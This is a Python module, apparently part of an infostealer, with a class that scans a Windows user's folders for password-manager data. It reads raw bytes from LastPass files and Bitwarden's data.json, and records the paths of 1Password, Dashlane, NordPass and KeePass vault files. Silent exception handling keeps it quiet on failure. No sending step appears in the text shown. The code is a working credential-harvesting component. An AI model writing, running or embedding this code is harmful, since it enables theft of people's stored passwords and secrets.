import os
import json
from glob import glob

class PasswordManagersCollector:
    def __init__(self):
        pass
    
    def collect_passwords(self):
        pm_data = {}
        try:
            if os.name == 'nt':
                appdata = os.getenv('APPDATA')
                localappdata = os.getenv('LOCALAPPDATA')
                userprofile = os.getenv('USERPROFILE')
                pm_data.update(self._onepassword(localappdata))
                pm_data.update(self._lastpass(localappdata))
                pm_data.update(self._bitwarden(appdata))
                pm_data.update(self._dashlane(appdata))
                pm_data.update(self._nordpass(appdata))
                pm_data.update(self._keepass(userprofile))
        except:
            pass
        return pm_data
    
    def _onepassword(self, localappdata):
        data = {}
        try:
            onepass_path = os.path.join(localappdata, '1Password', 'data')
            if os.path.exists(onepass_path):
                for root, dirs, files in os.walk(onepass_path):
                    for file in files:
                        if file.endswith(('.opvault', '.agilekeychain')):
                            data['1password_file'] = os.path.join(root, file)
        except:
            pass
        return data
    
    def _lastpass(self, localappdata):
        data = {}
        try:
            lastpass_path = os.path.join(localappdata, 'LastPass')
            if os.path.exists(lastpass_path):
                for root, dirs, files in os.walk(lastpass_path):
                    for file in files:
                        if file in ['lpall.slps', 'synced' + 'Settings', 'account-settings-', 'lp', 'path']:
                            file_path = os.path.join(root, file)
                            with open(file_path, 'rb') as f:
                                data[f'lastpass_{file}'] = f.read(1000).hex()
        except:
            pass
        return data
    
    def _bitwarden(self, appdata):
        data = {}
        try:
            bw_path = os.path.join(appdata, 'Bitwarden')
            if os.path.exists(bw_path):
                data_json = os.path.join(bw_path, 'data.json')
                if os.path.exists(data_json):
                    with open(data_json, 'r') as f:
                        data['bitwarden_data'] = f.read(2000)
        except:
            pass
        return data
    
    def _dashlane(self, appdata):
        data = {}
        try:
            dash_path = os.path.join(appdata, 'Dashlane')
            if os.path.exists(dash_path):
                for root, dirs, files in os.walk(dash_path):
                    for file in files:
                        if file.startswith('Dashlane') and file.endswith('.db'):
                            data['dashlane_db'] = os.path.join(root, file)
        except:
            pass
        return data
    
    def _nordpass(self, appdata):
        data = {}
        try:
            nord_path = os.path.join(appdata, 'NordPass')
            if os.path.exists(nord_path):
                for root, dirs, files in os.walk(nord_path):
                    for file in files:
                        if file.endswith('.db'):
                            data['nordpass_db'] = os.path.join(root, file)
        except:
            pass
        return data
    
    def _keepass(self, userprofile):
        data = {}
        try:
            for kdbx in glob(os.path.join(userprofile, '**', '*.kdbx'), recursive=True):
                data['keepass_file'] = kdbx
                break
        except:
            pass
        return data

